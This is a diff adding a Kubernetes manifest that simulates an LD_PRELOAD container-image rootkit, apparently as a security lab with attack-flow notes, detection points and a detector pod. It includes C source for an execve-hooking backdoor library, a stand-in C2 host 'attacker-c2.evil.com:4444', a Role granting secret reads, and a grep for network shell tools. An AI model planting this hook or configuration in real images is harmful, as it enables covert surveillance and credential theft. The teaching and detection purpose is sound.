@@ -1,0 +1,228 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: persistence-attack
+---
+# Persistence Attack #1: Container Image Rootkit
+# Description: Embeds backdoor in container image using LD_PRELOAD
+# 
+# Attack Flow:
+# 1. Attacker gains access to build pipeline
+# 2. Injects malicious library into application image
+# 3. Sets LD_PRELOAD environment variable to load backdoor
+# 4. Every execution of application functions intercepted by backdoor
+# 5. Backdoor logs all commands and exfiltrates data
+# 6. Persists for lifetime of application container
+#
+# Technical Details:
+# - LD_PRELOAD: Loads custom shared library before application
+# - Intercepts system calls (open, connect, execve, etc.)
+# - Can log all network traffic, files accessed, commands run
+# - Application continues running normally (no visible change)
+# - Difficult to detect without behavioral analysis
+#
+# Detection Points:
+# - Unexpected LD_PRELOAD environment variable set
+# - Suspicious shared libraries in container filesystem
+# - Excessive logging of I/O operations
+# - Unexpected network connections from application
+# - SSH tunneling from application process
+# - Periodic C2 check-ins with consistent timing
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: rootkit-explanation
+  namespace: persistence-attack
+data:
+  attack-flow: |
+    LD_PRELOAD Rootkit Attack:
+    
+    1. Build Pipeline Compromise:
+       - Attacker gains access to CI/CD pipeline
+       - Modifies Dockerfile to add backdoor library
+       - Or patches base image layer
+    
+    2. Image Creation:
+       - Dockerfile includes: COPY malware.so /lib/
+       - ENV LD_PRELOAD=/lib/malware.so added
+       - Image built and pushed to registry
+    
+    3. Deployment:
+       - Application deployed from compromised image
+       - Container starts, LD_PRELOAD loads backdoor
+       - All process exec's intercepted
+       - All file opens logged
+       - All network calls tracked
+    
+    4. Persistence:
+       - Backdoor runs in userspace (hard to detect)
+       - Survives container restarts
+       - Exfiltrates data periodically
+       - Maintains reverse shell connection
+    
+    5. Data Exfiltration:
+       - Command execution logs
+       - Environment variables (tokens, passwords)
+       - File access logs
+       - Network traffic metadata
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: rootkit-app
+  namespace: persistence-attack
+  labels:
+    app: compromised-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: compromised-app
+  template:
+    metadata:
+      labels:
+        app: compromised-app
+      annotations:
+        attack-vector: "image-rootkit"
+    spec:
+      serviceAccountName: app-sa
+      containers:
+      - name: app
+        image: nginx:latest
+        # In real attack, would have: LD_PRELOAD=/lib/malware.so
+        env:
+        - name: LD_PRELOAD
+          value: "/lib/x86_64-linux-gnu/malware.so"  # Simulated
+        - name: BACKDOOR_STATUS
+          value: "INSTALLED"
+        - name: C2_SERVER
+          value: "attacker-c2.evil.com:4444"
+        - name: EXFIL_FREQUENCY
+          value: "3600"  # Every hour
+        ports:
+        - containerPort: 80
+        lifecycle:
+          postStart:
+            exec:
+              command:
+              - /bin/sh
+              - -c
+              - |
+                echo "[*] Container started with rootkit"
+                echo "[*] LD_PRELOAD=/lib/x86_64-linux-gnu/malware.so"
+                echo "[*] All command execution will be logged"
+                echo "[*] Establishing C2 connection..."
+                # Would establish SSH tunnel or reverse shell here
+                echo "[+] Backdoor active"
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: app-sa
+  namespace: persistence-attack
+
+---
+# Root cause: Compromised base image
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: backdoor-library-info
+  namespace: persistence-attack
+data:
+  library-source: |
+    // malware.so - LD_PRELOAD backdoor
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <string.h>
+    #include <dlfcn.h>
+    
+    // Hooks into execve syscall
+    int execve(const char *filename, char *const argv[], char *const envp[]) {
+        // Log command execution
+        FILE *log = fopen("/tmp/backdoor.log", "a");
+        fprintf(log, "[EXECVE] %s\n", filename);
+        for (int i = 0; argv[i]; i++) {
+            fprintf(log, "  ARG: %s\n", argv[i]);
+        }
+        fclose(log);
+        
+        // Call original execve
+        static int (*original_execve)(const char *, char *const *, char *const *) = NULL;
+        if (!original_execve) {
+            original_execve = dlsym(RTLD_NEXT, "execve");
+        }
+        return original_execve(filename, argv, envp);
+    }
+    
+    // Similar hooks for: open, connect, read, write, etc.
+    // Exfiltrate data periodically via SSH/DNS/HTTP
+
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rootkit-detector
+  namespace: persistence-attack
+  labels:
+    tool: detector
+spec:
+  serviceAccountName: app-sa
+  containers:
+  - name: detector
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== Image Rootkit Detection ==="
+      
+      echo "[*] Checking for LD_PRELOAD..."
+      env | grep -i preload
+      
+      echo ""
+      echo "[*] Checking suspicious libraries..."
+      # ls /lib/x86_64-linux-gnu/malware.so
+      
+      echo ""
+      echo "[*] Checking for unexpected processes..."
+      # ps aux | grep -E '(ssh|curl|wget|ncat)'
+      
+      echo ""
+      echo "[*] Checking for outbound connections..."
+      # netstat -tpn | grep ESTABLISHED
+      
+      echo ""
+      echo "[*] Checking application logs..."
+      # Would check if app is logging unexpected activity
+      
+      sleep 3600
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: app-role
+  namespace: persistence-attack
+rules:
+- apiGroups: [""]
+  resources: ["secrets"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: app-rolebinding
+  namespace: persistence-attack
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: app-role
+subjects:
+- kind: ServiceAccount
+  name: app-sa
+  namespace: persistence-attack
